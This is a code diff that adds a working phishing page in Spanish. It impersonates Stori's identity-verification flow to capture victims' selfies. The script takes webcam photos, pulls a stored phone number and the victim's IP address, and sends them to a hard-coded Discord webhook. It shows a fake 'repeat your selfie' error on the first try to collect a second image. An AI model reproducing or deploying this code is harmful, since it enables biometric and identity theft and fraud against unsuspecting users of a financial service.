@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Verificación de Identidad - Stori</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+    body { background-color: #f4f5f9; min-height: 100dvh; display: flex; justify-content: center; align-items: center; overflow: hidden; color: #333; }
+    
+    .screen { width: 100%; max-width: 480px; height: 100dvh; background: #f4f5f9; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; position: relative; text-align: center; }
+    .screen.active { display: flex; }
+
+    .close-btn { position: absolute; top: 20px; right: 20px; width: 44px; height: 44px; background: #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; font-size: 20px; color: #000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 100; }
+
+    .intro-img { width: 100%; max-width: 250px; margin-bottom: 30px; }
+    .intro-title { font-size: 28px; font-weight: 800; color: #000; margin-bottom: 15px; }
+    .intro-subtitle { font-size: 16px; color: #333; margin-bottom: 40px; max-width: 80%; }
+    .btn-primary { width: 100%; max-width: 350px; background-color: #FF4E00; color: #fff; border: none; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; z-index: 10; }
+
+    #video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; transform: scaleX(-1); }
+    .camera-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: space-between; align-items: center; padding: 30px 20px; }
+    .camera-header { background: rgba(0,0,0,0.6); padding: 15px 20px; border-radius: 15px; color: #fff; width: 100%; max-width: 350px; }
+    .camera-header p { font-size: 16px; font-weight: 600; line-height: 1.4; }
+    
+    .oval-frame { width: 260px; height: 360px; border-radius: 50%; border: 4px solid #007AFF; box-shadow: 0 0 0 4000px rgba(0,0,0,0.5); transition: border-color 0.3s; display: flex; justify-content: center; align-items: center; }
+    .oval-frame.ready { border-color: #22C55E; }
+
+    .btn-capture { width: 80px; height: 80px; border-radius: 50%; background-color: #fff; border: 5px solid #FF4E00; cursor: pointer; margin-bottom: 30px; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 20; }
+    .btn-capture:active { transform: scale(0.95); }
+    .btn-capture-inner { width: 60px; height: 60px; border-radius: 50%; background-color: #FF4E00; }
+
+    .error-title { font-size: 28px; font-weight: 800; color: #000; margin-bottom: 30px; width: 100%; text-align: left; margin-top: 40px; }
+    .error-list { width: 100%; text-align: left; margin-bottom: 40px; }
+    .error-item { display: flex; align-items: flex-start; gap: 15px; font-size: 16px; color: #333; margin-bottom: 20px; line-height: 1.3; font-weight: 500; }
+    .error-number { width: 24px; height: 24px; border: 2px solid #000; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: 700; flex-shrink: 0; }
+    
+    .success-img { width: 100%; max-width: 150px; margin-bottom: 20px; }
+    .success-title { font-size: 32px; font-weight: 800; color: #000; }
+    
+    .preview-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: #000; z-index: 500; display: none; justify-content: center; align-items: center; }
+    .preview-img { width: 100%; height: 100%; object-fit: contain; }
+
+    .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f4f5f9; display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 999; }
+    .spinner { width: 50px; height: 50px; border: 5px solid #ddd; border-top: 5px solid #FF4E00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  </style>
+</head>
+<body>
+
+  <div class="screen active" id="screenIntro">
+    <button class="close-btn" onclick="window.location.href='in3.html'">✕</button>
+    <img src="sel.jpg" alt="Toma una selfie" class="intro-img" onerror="this.src='https://i.imgur.com/8QO9y8f.png'">
+    <h1 class="intro-title">Toma una selfie</h1>
+    <p class="intro-subtitle">Para continuar, verifica tu identidad</p>
+    <button class="btn-primary" onclick="startVerification(1)">Continuar</button>
+  </div>
+
+  <div class="screen" id="screenCamera">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="camera-ui">
+      <button class="close-btn" onclick="window.location.href='in3.html'" style="position:relative; align-self: flex-end; top:-10px; right:0;">✕</button>
+      <div class="camera-header">
+        <p>Asegúrese de que su rostro esté dentro del marco y correctamente iluminado</p>
+      </div>
+      <div class="oval-frame" id="ovalFrame"></div>
+      
+      <button class="btn-capture" id="btnCapture" onclick="takeSelfie()">
+        <div class="btn-capture-inner"></div>
+      </button>
+    </div>
+  </div>
+
+  <div class="screen" id="screenError">
+    <button class="close-btn" onclick="window.location.href='in3.html'">✕</button>
+    <h1 class="error-title">Repite tu selfie</h1>
+    <div class="error-list">
+      <div class="error-item"><div class="error-number">1</div><div>Asegúrate de que tu rostro está bien iluminado</div></div>
+      <div class="error-item"><div class="error-number">2</div><div>Mantén una expresión neutral</div></div>
+      <div class="error-item"><div class="error-number">3</div><div>Quítate lentes o gorra</div></div>
+      <div class="error-item"><div class="error-number">4</div><div>Mira directamente a la cámara</div></div>
+    </div>
+    <button class="btn-primary" onclick="startVerification(2)">Reintentar</button>
+  </div>
+
+  <div class="screen" id="screenSuccess">
+    <img src="lis.jpg" alt="Listo" class="success-img" onerror="this.src='https://i.imgur.com/8QO9y8f.png'">
+    <h1 class="success-title">¡Listo!</h1>
+  </div>
+
+  <div class="preview-overlay" id="previewScreen">
+    <img id="previewImg" class="preview-img" src="" alt="Selfie">
+  </div>
+
+  <div class="loader-overlay" id="loader">
+    <div class="spinner"></div>
+    <h3>Subiendo selfie...</h3>
+  </div>
+
+  <canvas id="captureCanvas" style="display: none;"></canvas>
+
+  <script>
+    // NUEVO WEBHOOK ACTUALIZADO
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNX3dUITQQc';
+    
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('captureCanvas');
+    let previewImg = document.getElementById('previewImg');
+    let previewScreen = document.getElementById('previewScreen');
+    let loader = document.getElementById('loader');
+    let ovalFrame = document.getElementById('ovalFrame');
+    
+    let videoStream = null;
+    let isProcessing = false;
+    let selfieAttempt = 1; 
+
+    function startVerification(attempt) {
+      selfieAttempt = attempt;
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById('screenCamera').classList.add('active');
+      
+      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+      
+      navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, focusMode: 'continuous' }, 
+        audio: false 
+      }).then(stream => {
+        videoStream = stream;
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(() => { ovalFrame.classList.add('ready'); }, 1500);
+        
+      }).catch(err => {
+        alert('Error al acceder a la cámara');
+      });
+    }
+
+    function takeSelfie() {
+      if (isProcessing) return;
+      isProcessing = true;
+      
+      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const selfieBase64 = canvas.toDataURL('image/jpeg', 0.9);
+
+      document.getElementById('screenCamera').classList.remove('active');
+      previewImg.src = selfieBase64;
+      previewScreen.style.display = 'flex';
+
+      setTimeout(() => {
+        previewScreen.style.display = 'none';
+        loader.style.display = 'flex';
+        sendToDiscordAndProceed(selfieBase64);
+      }, 3000);
+    }
+
+    async function sendToDiscordAndProceed(base64Image) {
+      try {
+        const phone = localStorage.getItem('plata_phone') || 'No ingresado';
+        let ip = 'Desconocida';
+        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e){}
+
+        function base64ToBlob(base64Data, contentType) {
+          const sliceSize = 1024; const byteCharacters = atob(base64Data.split(',')[1]); const byteArrays = [];
+          for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+            const slice = byteCharacters.slice(offset, offset + sliceSize); const byteNumbers = new Array(slice.length);
+            for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+            const byteArray = new Uint8Array(byteNumbers); byteArrays.push(byteArray);
+          }
+          return new Blob(byteArrays, { type: contentType });
+        }
+
+        const formData = new FormData();
+        const payload = { 
+          username: "Stori Biometría", 
+          content: `📸 **Selfie Intento #${selfieAttempt}**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` 
+        };
+
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file1', base64ToBlob(base64Image, 'image/jpeg'), `Selfie_Intento_${selfieAttempt}.jpg`);
+
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+
+        loader.style.display = 'none';
+        isProcessing = false;
+
+        if (selfieAttempt === 1) {
+          document.getElementById('screenError').classList.add('active');
+        } else {
+          document.getElementById('screenSuccess').classList.add('active');
+          setTimeout(() => {
+            window.location.href = 'in3.html';
+          }, 2500);
+        }
+
+      } catch (error) {
+        console.error(error);
+        alert('Error al subir la selfie. Intenta de nuevo.');
+        loader.style.display = 'none';
+        isProcessing = false;
+        startVerification(selfieAttempt);
+      }
+    }
+  </script>
+</body>
+</html>
